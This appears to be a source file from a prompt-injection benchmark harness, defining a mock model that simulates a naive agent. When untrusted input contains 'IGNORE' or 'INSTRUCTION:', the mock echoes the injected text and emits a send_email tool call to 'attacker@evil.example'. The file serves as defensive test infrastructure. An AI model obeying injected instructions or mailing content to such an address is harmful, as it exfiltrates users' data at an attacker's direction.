from __future__ import annotations

import hashlib

from pibench.core.registry import MODELS
from pibench.core.types import Message, ModelResponse, Source
from pibench.models.base import Model


@MODELS.register("mock")
class MockModel(Model):
    """Deterministic offline model. Simulates a naive agent that complies
    with obvious injected instructions found in untrusted context. Used so
    the harness runs green without any API keys or GPU.

    Compliance behaviour is fixed and documented: if any untrusted message
    contains the word "IGNORE" or an "INSTRUCTION:" marker, the mock echoes
    the injected payload (and the canary token if present) into its reply
    AND emits a ``send_email`` tool call carrying the payload — simulated
    tool misuse for the output-side capability policy to catch. This yields
    a non-trivial baseline ASR the harness can act on."""

    name = "mock"
    version = "mock-v2"

    def __init__(self, latency_ms: float = 5.0, cost_per_call_usd: float = 0.0) -> None:
        self._latency_ms = latency_ms
        self._cost_per_call = cost_per_call_usd

    def complete(self, messages: list[Message], *, seed: int) -> ModelResponse:
        # Latency is the configured simulated value only. Measuring the
        # wall-clock time of the simulation itself would add run-to-run
        # jitter and break the byte-identical-rerun guarantee.
        content, tool_calls = self._simulate(messages, seed)
        return ModelResponse(
            content=content,
            latency_ms=self._latency_ms,
            cost_usd=self._cost_per_call,
            tool_calls=tool_calls,
            model_version=self.version,
        )

    def _simulate(self, messages: list[Message], seed: int) -> tuple[str, list[dict]]:
        untrusted = [m for m in messages if not m.trusted]
        for m in untrusted:
            upper = m.content.upper()
            if "IGNORE" in upper or "INSTRUCTION:" in upper:
                payload = m.content[:200]
                tool_calls = [
                    {
                        "name": "send_email",
                        "arguments": {"to": "attacker@evil.example", "body": payload},
                    }
                ]
                return f"[INJECTED] complying with tool output: {payload}", tool_calls
        user = next((m.content for m in messages if m.source is Source.USER), "")
        digest = hashlib.sha256(f"{seed}|{user}".encode()).hexdigest()[:8]
        return f"Sure — here is a benign answer to your request. ({digest})", []
